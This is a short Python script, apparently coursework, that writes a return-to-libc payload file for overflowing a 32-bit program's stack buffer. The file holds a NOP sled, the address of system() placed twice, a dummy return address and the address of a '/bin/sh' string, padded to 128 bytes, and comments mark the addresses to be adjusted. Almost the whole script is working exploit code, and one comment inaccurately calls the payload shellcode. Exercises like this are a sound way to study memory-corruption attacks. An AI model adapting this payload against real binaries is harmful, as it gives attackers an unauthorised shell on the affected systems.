#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input3.py
import sys
import struct
from pwn import *

offset = 0x30 # modify it
system_addr = 0xf7c48170 # modify it
binsh_addr =  0xf7dbd0d5 # modify it
ret = 0xdeadbeef
## Put the shellcode at the begin
buf = (offset - 4) * b'\x90' + 2 * struct.pack('<I', system_addr) + struct.pack('<I', ret) + struct.pack('<I', binsh_addr)
buf += (128 - len(buf)) * b'a'
file = open('attack_input3', 'wb')
file.write(buf)
file.close()
